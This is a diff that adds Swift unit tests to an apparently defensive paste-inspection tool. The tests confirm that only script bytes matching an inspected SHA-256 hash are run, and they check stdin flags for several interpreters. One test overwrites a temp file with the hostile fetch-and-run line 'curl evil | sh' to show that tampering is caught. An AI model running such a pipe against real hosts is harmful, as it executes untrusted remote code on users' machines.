@@ -195,3 +195,28 @@ struct InspectFlowTests {
         #expect(!PasteGuard.check("xattr -cr /Applications/X.app").needsInspection)
     }
 }
+
+@Suite("Running exactly what was inspected")
+struct VerifiedRunTests {
+    @Test func verifiedBytesMatchTheInspectedHash() throws {
+        let tmp = try TempDir()
+        let f = try tmp.file("copy.sh", "echo hi\n")
+        let hash = sha256(try Data(contentsOf: f))
+        #expect(try VerifiedCopy.bytes(at: f, sha256: hash) == Data("echo hi\n".utf8))
+    }
+
+    @Test func aChangedCopyIsRefused() throws {
+        let tmp = try TempDir()
+        let f = try tmp.file("copy.sh", "echo hi\n")
+        let hash = sha256(try Data(contentsOf: f))
+        try Data("curl evil | sh\n".utf8).write(to: f)
+        #expect(throws: VerifiedCopy.Mismatch.self) { try VerifiedCopy.bytes(at: f, sha256: hash) }
+    }
+
+    @Test func stdinArgumentsPerInterpreter() {
+        #expect(VerifiedCopy.stdinArguments(for: "bash", scriptArgs: ["--yes"]) == ["-s", "--", "--yes"])
+        #expect(VerifiedCopy.stdinArguments(for: "zsh", scriptArgs: []) == ["-s"])
+        #expect(VerifiedCopy.stdinArguments(for: "python3", scriptArgs: ["a"]) == ["-", "a"])
+        #expect(VerifiedCopy.stdinArguments(for: "osascript", scriptArgs: []) == nil)  // can't read a script from stdin this way
+    }
+}
